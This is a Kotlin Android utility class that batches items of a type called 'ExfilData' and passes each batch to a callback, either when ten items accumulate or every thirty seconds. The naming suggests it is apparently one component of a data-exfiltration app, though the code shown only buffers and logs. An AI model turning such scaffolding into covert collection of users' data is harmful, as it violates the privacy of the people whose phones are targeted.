package com.yourpackage.utils

import android.os.Handler
import android.os.Looper
import android.util.Log
import com.yourpackage.data.ExfilData

/**
 * Manages batching of ExfilData items.
 * Sends batches when either:
 * 1. Buffer reaches MAX_BATCH_SIZE (10 items)
 * 2. Timeout reaches MAX_WAIT_TIME (30 seconds)
 */
class BatchManager(
    private val onBatchReady: (List<ExfilData>) -> Unit
) {
    companion object {
        private const val TAG = "BatchManager"
        private const val MAX_BATCH_SIZE = 10
        private const val MAX_WAIT_TIME_MS = 30_000L // 30 seconds
    }

    private val buffer = mutableListOf<ExfilData>()
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    private var flushRunnable: Runnable? = null

    fun start() {
        if (isRunning) {
            Log.d(TAG, "BatchManager already running")
            return
        }
        isRunning = true
        Log.d(TAG, "🔄 BatchManager started")
        scheduleFlush()
    }

    fun stop() {
        isRunning = false
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushRunnable = null
        flushBuffer()
        Log.d(TAG, "⏹️ BatchManager stopped")
    }

    fun add(item: ExfilData) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping item")
            return
        }

        synchronized(buffer) {
            buffer.add(item)
            Log.d(TAG, "📥 Added item (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    fun addAll(items: List<ExfilData>) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping ${items.size} items")
            return
        }

        synchronized(buffer) {
            buffer.addAll(items)
            Log.d(TAG, "📥 Added ${items.size} items (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    private fun scheduleFlush() {
        if (!isRunning) return

        flushRunnable = Runnable {
            if (isRunning) {
                synchronized(buffer) {
                    if (buffer.isNotEmpty()) {
                        Log.d(TAG, "⏰ Timeout reached, flushing ${buffer.size} items")
                        flushBuffer()
                    }
                }
                scheduleFlush()
            }
        }

        handler.postDelayed(flushRunnable!!, MAX_WAIT_TIME_MS)
    }

    private fun flushBuffer() {
        val itemsToSend: List<ExfilData>

        synchronized(buffer) {
            if (buffer.isEmpty()) return
            itemsToSend = buffer.toList()
            buffer.clear()
        }

        Log.d(TAG, "📤 Flushing ${itemsToSend.size} items")
        try {
            onBatchReady(itemsToSend)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during batch flush: ${e.message}")
            // Re-add items on failure
            synchronized(buffer) {
                buffer.addAll(0, itemsToSend)
            }
        }
    }

    fun getBufferSize(): Int {
        synchronized(buffer) {
            return buffer.size
        }
    }

    fun isActive(): Boolean = isRunning

    fun forceFlush() {
        if (isRunning) {
            flushBuffer()
        }
    }
}
